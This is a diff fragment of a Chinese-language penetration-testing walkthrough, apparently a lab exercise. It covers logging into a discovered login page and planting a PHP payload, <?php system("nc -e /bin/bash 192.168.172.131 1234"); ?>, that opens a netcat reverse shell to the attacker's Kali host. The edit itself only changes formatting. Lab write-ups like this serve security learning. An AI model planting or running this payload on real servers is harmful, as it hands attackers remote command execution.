@@ -86,7 +86,7 @@ tag:
 14. 根据地址找到登录页面并登录
 
      ![image](assets/image-20240823170301-a66hd2d.png)
-15. 然后将反弹shell的命令  <?php system("nc -e /bin/bash 192.168.172.131 1234"); ?>   IP地址为kali的IP地址  nc反向shell
+15. 然后将反弹shell的命令`  <?php system("nc -e /bin/bash 192.168.172.131 1234"); ?>   `IP地址为kali的IP地址  nc反向shell
 
      System()函数的主要功能是在系统权限允许的情况是执行系统命令
      ![image](assets/image-20240823170751-7fzsrm6.png)
